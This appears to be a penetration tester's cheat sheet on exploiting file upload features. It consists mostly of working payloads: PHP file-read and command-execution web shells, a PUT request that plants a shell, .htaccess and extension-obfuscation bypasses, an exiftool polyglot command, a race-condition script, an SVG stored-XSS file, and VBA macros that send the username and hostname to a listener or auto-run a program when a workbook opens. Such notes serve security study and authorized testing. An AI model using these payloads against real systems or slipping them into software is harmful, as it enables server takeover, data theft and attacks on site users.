# File Upload

<details>

<summary>Basic Payloads</summary>

{% code lineNumbers="true" %}
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
{% endcode %}

</details>

### RCE via Web Shell

* Upload payload file&#x20;
* No restriction specified in accept-type header - all types (_/_) allowed

### Content-Type Restriction Bypass

* Modify `Content-Type` header to allowed file types
* Upload any php/similar file
* Server does not validate content-type header with the file extension or contents

### Path Traversal Bypass

* Restrictions on user-directory for permitted file types&#x20;
* Change the directory where files are uploaded
* Filename contains -> `../../exploit.php` (try encoding for ../../)

### Extension Blacklist Bypass&#x20;

* Overriding server configuration (etc/apache2/apache2.conf)&#x20;
* `LoadModule php_module /usr/lib/apache2/modules/libphp.so`\
  `AddType application/x-httpd-php .php`&#x20;
* Create special configuration file within individual directories
* Upload a .htaccess file
* `AddType application/x-httpd-php .133t`&#x20;
* Modify `Content-Type` to text/plain&#x20;
* Upload a php payload with extension .133t which will be treated as php file.

### Obfuscated File Extension&#x20;

* Try following patterns&#x20;
  * filename.php.jpg, filename.jpg.php, filename.php., filename%2Ephp (url encode), filename.pphphp&#x20;
* Provide multiple extensions&#x20;
* Add trailing characters (".") - > filename.php.&#x20;
* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes&#x20;
* Add semicolons or URL-encoded null byte characters before the file extension.&#x20;
* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (xC0 x2E, xC4 xAE or xC0 xAE translated to x2E if parsed as UTF-8 string)&#x20;
* Use nested extensions to bypass stripping

### Flawed Validation of the File's Contents&#x20;

* Certain file types may always contain a specific sequence of bytes in their header or footer&#x20;
* eg -> JPEG files always begin with the bytes FF D8 FF&#x20;
* [ExifTool](https://exiftool.org/)
  * Create a polyglot JPEG file containing malicious code within its metadata \*
  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
  * Output between START and END strings

### Exploiting File Upload Race Conditions&#x20;

* [race-conditions.md](race-conditions.md "mention")
* Uploads the file to a temp directory and perform validation - virus checks etc&#x20;
* Uploaded file is moved to an accessible folder, where checked for viruses.&#x20;
* Malicious files are removed once the virus check completes&#x20;
* Turbo Intruder extender required

<details>

<summary>Race Condition Code</summary>

{% code lineNumbers="true" %}
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
    request1 = '''<YOUR-POST-REQUEST>'''
    request2 = '''<YOUR-GET-REQUEST>'''
    
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    
    for x in range(5):
        engine.queue(request2, gate='race1')
        # wait until every 'race1' tagged request is ready
    	# then send the final byte of each request
    	# (this method is non-blocking, just like queue)
    
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
{% endcode %}

</details>

### Malicious Client-Side Scripts

* Upload HTML files or SVG images
* Use tags to create stored XSS payloads

<details>

<summary>SVG Payload</summary>

{% code lineNumbers="true" %}
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">alert("XSS");</script>
  </svg>
```
{% endcode %}

</details>

<details>

<summary>VBA Script</summary>

{% code lineNumbers="true" %}
```vba
#Script - 1
Sub SendHostInfoToServer()
    Dim Username As String
    Dim Hostname As String
    Dim Url As String
    Dim Http As Object

    On Error GoTo ErrorHandler

    Username = Environ("USERNAME")
    Hostname = Environ("COMPUTERNAME")
    Url = "http://127.0.0.1:8888/receive?username=" & Username & "&hostname=" & Hostname

    Set Http = CreateObject("MSXML2.ServerXMLHTTP")
    Http.Open "GET", Url, False
    Http.Send

    MsgBox "Information sent successfully to: " & Url
    Exit Sub

ErrorHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Macro Error"
End Sub

#Script - 2 (part 1)

Sub LaunchCalculator()
    On Error GoTo ErrorHandler

    Dim ShellApp As Object
    Set ShellApp = CreateObject("WScript.Shell")
    ShellApp.Run "calc.exe"

    Exit Sub

ErrorHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Launch Error"
End Sub

#Script - 2 (part 2)

#add in "This_Workbook"

Private Sub Workbook_Open()
    LaunchCalculator
End Sub
```
{% endcode %}

</details>

### Exploiting Vulnerabilities in the Parsing of Uploaded Files&#x20;

* Server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks.

### Uploading Files using PUT

<details>

<summary>HTTP Request</summary>

{% code lineNumbers="true" %}
```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php system($_GET[‘c’]);?>
```
{% endcode %}

</details>



